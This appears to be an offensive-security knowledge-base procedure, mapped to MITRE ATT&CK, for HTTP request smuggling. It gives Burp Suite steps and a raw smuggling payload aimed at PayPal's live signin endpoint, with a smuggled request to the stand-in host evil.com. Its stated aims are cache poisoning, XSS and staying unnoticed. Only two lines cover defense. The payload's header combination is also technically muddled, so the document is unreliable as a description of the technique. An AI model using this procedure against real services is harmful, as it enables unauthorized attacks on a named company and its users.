---
tags:
  - http-request-smuggling
  - web-exploitation
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Initial Access]]'
commands: []
platforms:
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: advanced
impact_level: high
detection_risk: high
sub_techniques: []
id: 665a33fd-ccbf-46de-9f65-75567fb3ad7c
created_at: '2025-12-11T03:47:56.915Z'
updated_at: '2025-12-11T03:47:56.915Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0001]]'
mitre_techniques:
  - '[[T1190]]'
---
# Perform HTTP Request Smuggling

## Summary

This procedure exploits differences in HTTP request parsing between frontend and backend servers to smuggle malicious requests, enabling attacks like cache poisoning.

## Description

HTTP request smuggling occurs when ambiguous request formats (e.g., conflicting Content-Length and Transfer-Encoding headers) cause desynchronization. In this scenario, it's used against PayPal's caching servers to inject unauthorized requests, leading to cached redirects and potential XSS. The target is web-based with frontend caching; expected outcome is successful smuggling without alerting backend systems.

## Requirements

1. Access to a proxy tool like [[tools/Burp-Suite]] for request manipulation
2. Public endpoint like https://paypal.com/signin
3. Knowledge of HTTP/1.1 parsing behaviors

## Defense

Defensive measures and detection strategies:

- Enforce strict HTTP parsing and reject ambiguous requests
- Monitor for anomalous cache hits or redirect patterns in logs

## Objectives

1. Achieve request desynchronization
2. Inject smuggled content into the request stream
3. Prepare for cache poisoning

## Instructions

### Step 1: Set Up Proxy and Intercept Request

**Context**: Configure a tool to capture and modify requests to the target.

Launch [[tools/Burp-Suite]] and intercept a request to https://paypal.com/signin.

> This allows manual editing of headers.

### Step 2: Craft and Send Smuggled Request

**Context**: Modify the request to include smuggling elements.

Execute [[commands/craft-smuggled-http-request]]:

```http
POST /signin HTTP/1.1
Host: paypal.com
Content-Length: 0
Transfer-Encoding: chunked

0

GET /attacker HTTP/1.1
Host: evil.com
```

> This smuggles a GET request, potentially poisoning downstream processing.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques

## Commands Used

- [[commands/craft-smuggled-http-request]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- [[commands/craft-smuggled-http-request]]
- #web-vulnerability
